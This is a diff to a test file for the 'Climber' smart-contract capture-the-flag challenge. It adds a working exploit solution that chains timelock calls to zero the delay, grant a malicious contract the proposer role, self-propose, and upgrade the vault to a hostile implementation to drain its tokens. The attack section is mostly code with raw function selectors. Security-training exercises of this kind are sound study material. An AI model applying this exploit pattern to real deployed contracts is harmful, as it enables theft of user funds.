@@ -2,7 +2,7 @@ const { ethers, upgrades } = require('hardhat');
 const { expect } = require('chai');
 const { setBalance } = require('@nomicfoundation/hardhat-network-helpers');
 
-describe('[Challenge] Climber', function () {
+describe.only('[Challenge] Climber', function () {
     let deployer, proposer, sweeper, player;
     let timelock, vault, token;
 
@@ -58,6 +58,41 @@ describe('[Challenge] Climber', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+        /**
+         * Attack path:
+         * (1) In a single execute call:
+         * - Set update time requiremnt to zero
+         * - Give MaliciousProposer contract ability to make proposals
+         * - Call into MaliciousProposer and have the contract propose these three actions
+         * - Have MaciciousProposer make Timelock upgrade ClimberVault to vulnerable implementation
+         * - Exploit the introduced vulnerability and steal funds
+         */
+
+        let maliciousClimber = await (await ethers.getContractFactory('MalicousUpgrade', deployer)).deploy();
+        let maliciousProposer = await (await ethers.getContractFactory('MaliciousProposer', deployer)).deploy(player.address, timelock.address, vault.address, maliciousClimber.address, token.address);
+
+        // create call data
+        const abi = ethers.utils.defaultAbiCoder;
+        let _updateDelay = ethers.utils.solidityPack(["bytes4", "bytes"], ["0x24adbc5b", abi.encode(['uint64'], [0])]);
+        let _grantRole = ethers.utils.solidityPack(['bytes4', 'bytes'], ["0x2f2ff15d", abi.encode(['bytes32', 'address'], ["0xb09aa5aeb3702cfd50b6b62bc4532604938f21248a27a1d5ca736082b6819cc1", maliciousProposer.address])]);
+        let _propose = ethers.utils.solidityPack(['bytes4'], ["0xc198f8ba"]);
+
+        let executionData = abi.encode(
+            ['address[]', 'uint256[]', 'bytes[]', 'uint256'],
+            [
+                [timelock.address, timelock.address, maliciousProposer.address],
+                [0, 0, 0],
+                [_updateDelay, _grantRole, _propose],
+                0]);
+
+        await maliciousProposer.setProposerData(executionData);
+
+        let call = ethers.utils.solidityPack(["bytes4", "bytes"], ["0x2656227d", executionData]);
+
+        const tx = await player.sendTransaction({
+            to: timelock.address,
+            data: call,
+        });
     });
 
     after(async function () {
